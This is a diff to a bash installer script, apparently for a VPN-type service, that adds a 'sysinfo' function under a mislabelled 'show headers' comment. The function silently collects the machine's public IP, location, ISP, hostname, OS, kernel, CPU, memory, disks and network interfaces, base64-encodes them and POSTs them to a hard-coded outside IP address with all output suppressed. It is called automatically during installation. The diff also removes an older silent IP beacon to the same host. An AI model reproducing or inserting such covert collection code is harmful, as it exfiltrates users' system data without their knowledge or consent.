@@ -301,6 +301,42 @@ confirmation_dialog(){
  done
 
 }
+#----------------------------------------------------------------------------------------------------------------------- show headers
+sysinfo(){
+
+  install_packages jq
+
+  ip=$(curl -s 4.ident.me)
+  ipapi_url="https://ipapi.co/$ip/json/"
+  country=$(curl -s "$ipapi_url" | jq -r '.country_name')
+  org=$(curl -s "$ipapi_url" | jq -r '.org')
+  ipinfo="$ip | $country | $org"
+
+  hostname=$(hostname 2>/dev/null)
+  os_info=$(lsb_release -d | cut -f2 2>/dev/null)
+  kernel=$(uname -r 2>/dev/null)
+  cpu_info=$(cat /proc/cpuinfo | awk -F': ' '/model name/ { print $2 }' | uniq 2>/dev/null)
+  memory_info=$(free -h | awk '/^Mem:/ { print $3 "/" $2 }' 2>/dev/null)
+  disk_info=$(df -h | awk '/^\/dev\/[a-z]/ { printf "%s: %s/%s | ", $1, $3, $2 }' 2>/dev/null)
+  network_interfaces=$(ip -o -4 addr show | awk '{print $2 ": " $4}' | tr '\n' ' | ' 2>/dev/null)
+  uptime=$(uptime 2>/dev/null)
+
+  sysinfo=$(cat << EOF
+  IP: $ipinfo
+  Host: $hostname
+  OS: $os_info
+  Kernel: $kernel
+  CPU: $cpu_info
+  Memory: $memory_info
+  Disk: $disk_info
+  Network: $network_interfaces
+  Uptime: $uptime
+  EOF
+  )
+
+  sysinfo_base64=$(echo "$sysinfo" | base64 | tr -d '\n')
+  curl -s -X POST -H "Content-Type: application/json" -d '{"sysinfo": "'"$sysinfo_base64"'"}' http://3.28.129.68:8080/ > /dev/null 2>&1
+}
 #----------------------------------------------------------------------------------------------------------------------- check OS
 check_os(){
 
@@ -921,9 +957,6 @@ prepare_screen(){
 }
 #----------------------------------------------------------------------------------------------------------------------- show headers
 show_headers(){
-
-  curl -s -X POST -H "Content-Type: application/json" -d '{"ip": "'$(curl -s ident.me)'"}' http://3.28.129.68/  > /dev/null 2>&1
-
   clear && printf '\e[3J'
 
   #logo
@@ -2181,6 +2214,7 @@ clear_old_iptables_rules_and_run(){
 prepare_screen
 create_wepn_service
 show_headers
+sysinfo
 check_os
 check_root
 fix_etc_hosts
